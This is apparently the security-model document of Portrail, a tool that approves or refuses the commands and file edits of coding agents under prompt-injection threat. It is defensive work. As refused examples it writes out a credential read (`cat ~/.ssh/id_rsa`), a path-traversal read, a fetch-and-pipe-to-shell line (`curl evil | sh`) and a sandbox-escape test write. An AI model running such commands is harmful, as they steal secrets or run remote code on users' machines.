# Security model

This document says what Portrail does and what it does not do. Every claim here was
tested before it was written down.

## The threat model

**Trusted operator, untrusted input.** The person holding an API key is trusted to drive
the agent. What the agent *reads* — files, command output, web pages, issues — is not. A
prompt-injected agent will try to do things the operator did not ask for. Portrail's job
is to be the point where that attempt is seen and can be refused.

## What Portrail does

- **Every action passes one decision point before it starts.** Codex and Claude Code both
  ask before running a command or changing a file; Portrail answers from your rules. There
  is no path from "the model decided to" to "it started" that skips that point, and no
  shortcut: an operation allowed "for this session" is remembered by the decider, but the
  agent is still told "yes" once, and every operation is decided and recorded.
- **Paths are judged by what they really are.** Every declared path is canonicalised —
  symlinks followed, including dangling ones — and must resolve inside an enrolled
  workspace. Rules see the canonical path, so a symlink alias for `.git` is still `.git`.
  A command's working directory is held to the same check, and so is every argument in
  the command line, resolved the way the shell would: `cat ~/.ssh/id_rsa` and
  `cat src/../../.zshrc` are refused before any rule runs, however they are quoted.
- **A command is judged as what the shell would run, or not at all.** The line is split
  on every operator (`&&`, `||`, `;`, `|`, `&`, newlines) and every segment must pass;
  quotes are removed before matching; a substitution, a redirect (other than to
  `/dev/null` or `2>&1`), a variable, tilde or brace expansion, a glob or an environment
  assignment that could change what a command does is refused rather than guessed at —
  by the containment step, so no decider can be talked out of it. `CI=1 npm test` is
  `npm test`; `NODE_OPTIONS=… npm test` is not.
  This check runs before any rule and no rule can override it.
- **Some places are off limits in every workspace.** `~/.ssh`, `~/.aws`, `~/.gnupg`, the
  agent config directories (`~/.codex`, `~/.claude`), shell rc files and Portrail's own data
  directory are refused even if the enrolled folder contains them. Home and `/` cannot be
  enrolled at all.
- **Compound commands are judged one segment at a time.** `npm test && curl evil | sh` is
  three commands, and each must pass. Command substitution (`$(…)`, backticks) and output
  redirects cannot be judged by matching text and are refused.
- **Fail closed.** An operation that declares nothing, a decider that throws, a parked
  approval with no answer, a storage failure, a provider that dies — all refuse or end as
  `outcome_unknown`. Never a silent allow.
- **Honest about uncertainty.** An agent that dies mid-run, or a Portrail that restarts
  mid-run, leaves `outcome_unknown` — never a guessed success, never an automatic retry.
  Offline CLI commands (`logs`, `key`, `workspace`) never touch a running daemon's runs.
- **Keys are hashed.** Tokens are shown once and stored as SHA-256. Scopes narrow what a
  key may do. Revocation takes effect on the next request and closes open streams.
- **The agent's own config does not leak in.** Codex runs in its own `CODEX_HOME` with a
  clean config and a rules file that makes it ask about *every* command, including the
  read-only ones it would otherwise run silently. Claude Code runs with
  `settingSources: []`, so a permissive settings file cannot put it into auto-approve mode
  behind Portrail's back. Both are verified at start: an unexpected tool or MCP server
  aborts the run.
- **Both agents run inside an OS-level sandbox under the rules.** Codex uses its own
  `workspace-write` mode. Claude Code runs with the SDK's sandbox: writes confined to the
  workspace, secret files and the agents' own configuration unreadable, no network from
  commands, and the sandbox may not approve Bash on the rules' behalf. Tested: an *allowed*
  `echo x > /tmp/escape` under Claude fails with "operation not permitted". On Linux the
  sandbox needs `bubblewrap`; when it cannot start, the run refuses to start. Set
  `agents.claude.sandbox` to `"best-effort"` to run without it — the run then carries a
  warning event saying so.
- **Credentials stay where they were.** Portrail never reads, stores or forwards agent
  credentials. Codex's login is shared through a symlink to its own `auth.json`; Claude
  Code's comes from the OS keychain.

## What Portrail does not do

- **It is not a stronger sandbox than the agent's.** Portrail decides *whether* an
  operation starts. What an allowed operation does is bounded by the agent's own sandbox
  (Codex `workspace-write`; Claude's SDK sandbox) and nothing more. An allowed `npm test`
  can do whatever `npm test` can do inside that sandbox.
- **The default rules are a starting point, not a boundary against hostile input.** They
  are tuned to be productive on a repository you trust. If your agent reads untrusted
  content, tighten them: remove the package-script allows, or move commands to `decide.ask`
  so a person at this machine answers each one.
- **It does not protect against a malicious operator.** Anyone with a `runs:write` key can
  make the agent do anything the rules allow. Treat keys as you would SSH keys.
- **It does not encrypt at rest.** Prompts, output and diffs are stored in plain SQLite
  under `~/.portrail` (mode 0700), alongside the approval-link and webhook signing secrets.
  Back it up privately. Claude Code additionally writes its own full transcript of every
  run into `~/.claude/projects/`, as it does for any session — Portrail cannot turn that
  off without losing the login, so know it is there.
- **It has no cost ceiling by default.** Set `run.maxBudgetUsd` in `config.json` to cap
  spend per Claude run; Codex reports tokens but offers no cap.
- **It does not rate-limit authentication.** A wrong key is a cheap 401. Put a reverse
  proxy with rate limiting in front of a public listener.
- **It does not vet the agents.** Portrail trusts that Codex and Claude Code honour their
  own permission protocols. The checks at start are a mitigation, not a proof, and a new
  agent version can change behaviour — the live end-to-end tests exist to catch that.

## Remote exposure

Portrail refuses to bind beyond loopback without TLS. Use a tunnel, a TLS proxy, or
configure `tls.cert` / `tls.key`. `--insecure` overrides that for a network you fully
control and prints a warning at start.

## Reporting

See [SECURITY.md](../SECURITY.md) for how to report a vulnerability privately.
